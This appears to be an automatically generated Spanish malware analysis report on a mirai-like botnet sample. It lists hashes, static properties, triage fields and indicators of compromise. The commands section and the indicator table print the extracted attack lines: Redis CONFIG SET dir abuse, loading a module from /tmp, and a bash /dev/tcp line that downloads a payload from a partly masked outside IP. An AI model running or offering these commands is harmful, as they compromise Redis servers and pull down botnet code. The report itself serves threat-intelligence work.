# 🧬 Payload Analysis

`d9e0abbd818e17dae5a8c8ad4c6d0d58abd467446e1016d1d0121bb366852a8d`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Ejecución. Se identificaron 4 comandos observados o extraídos. Se identificaron 6 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/botnet/d9e0abbd818e17dae5a8c8ad4c6d0d58abd467446e1016d1d0121bb366852a8d.md](../../../../../malware-like/oraculo/botnet/d9e0abbd818e17dae5a8c8ad4c6d0d58abd467446e1016d1d0121bb366852a8d.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:34:59.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d9e0abbd818e17dae5a8c8ad4c6d0d58abd467446e1016d1d0121bb366852a8d`
- **SHA1:** `340698ef15dd3c19101574c2fec3fd0f936c5a95`
- **MD5:** `0ea53c26e706437487837f0a185968ac`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (798), with CRLF line terminators |
| Tamaño | 2.8 KiB |
| Entropía | 6.02 |
| Strings | 22 |

## 🧠 Comportamiento observado

1. **Ejecución**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with very long lines (798), with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
config set dir /var/spool/cron/
CONFIG SET dir /tmp/
MODULE LOAD /tmp/exp.so
system.exec "bash -c \"exec 6<>/dev/tcp/203.57.109.XXX/60114 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/YWsxIHrj2d &
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 203.57.109.XXX | static_analysis |
| command | config set dir /var/spool/cron/ | strings |
| command | CONFIG SET dir /tmp/ | strings |
| command | MODULE LOAD /tmp/exp.so | strings |
| command | system.exec "bash -c \"exec 6<>/dev/tcp/203.57.109.XXX/60114 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/YWsxIHrj2d & | strings |
| hash | d9e0abbd818e17dae5a8c8ad4c6d0d58abd467446e1016d1d0121bb366852a8d | static_analysis |
| ip | 101.126.159.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | candidate malware unknown |
| Prioridad | medium |
| Score | 5.0 |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
